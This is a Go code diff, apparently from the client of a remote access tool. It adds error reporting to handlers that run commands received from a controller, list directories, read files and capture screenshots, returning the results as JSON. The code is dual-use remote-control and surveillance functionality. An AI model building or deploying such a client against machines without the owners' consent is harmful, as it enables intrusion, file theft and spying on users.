@@ -11,6 +11,10 @@ import (
 	"github.com/kbinani/screenshot"
 )
 
+func (c *Client) sendError(message common.Message, err error) {
+	c.SendJsonMessage(common.CreateMessage(common.ErrorData{Type: message.Type, Error: err.Error()}))
+}
+
 func (c *Client) initializeHandlers() {
 	c.Actions = make(map[string]func(message common.Message))
 
@@ -25,7 +29,8 @@ func (c *Client) initializeHandlers() {
 		}
 		output, err := Exec(content.Command)
 		if err != nil {
-			//handle err
+			c.sendError(message, err)
+			return
 		}
 		content.Output = string(output)
 		c.SendJsonMessage(common.CreateMessage(content))
@@ -38,7 +43,8 @@ func (c *Client) initializeHandlers() {
 		var files []common.File
 		osFiles, err := os.ReadDir(content.Path)
 		if err != nil {
-			//failed to read dir contents
+			c.sendError(message, err)
+			return
 		}
 		for _, file := range osFiles {
 			files = append(files, common.File{Name: file.Name(), IsDirectory: file.Type().IsDir()})
@@ -52,14 +58,16 @@ func (c *Client) initializeHandlers() {
 		common.DecodeData(message.Data, &content)
 		output, err := os.ReadFile(content.Path)
 		if err != nil {
-			//failed to read file
+			c.sendError(message, err)
+			return
 		}
 		c.SendJsonMessage(common.CreateMessage(common.ReadFileData{Path: content.Path, Content: output}))
 	}
 	c.Actions["ScreenshotData"] = func(message common.Message) {
 		image, err := screenshot.CaptureDisplay(0)
 		if err != nil {
-			//failed to capture screenshot
+			c.sendError(message, err)
+			return
 		}
 		buf := new(bytes.Buffer)
 
@@ -68,7 +76,8 @@ func (c *Client) initializeHandlers() {
 
 		imageBytes, err := io.ReadAll(buf)
 		if err != nil {
-			//failed to read all bytes from jpeg
+			c.sendError(message, err)
+			return
 		}
 
 		c.SendJsonMessage(common.CreateMessage(common.ScreenshotData{Screenshot: imageBytes}))
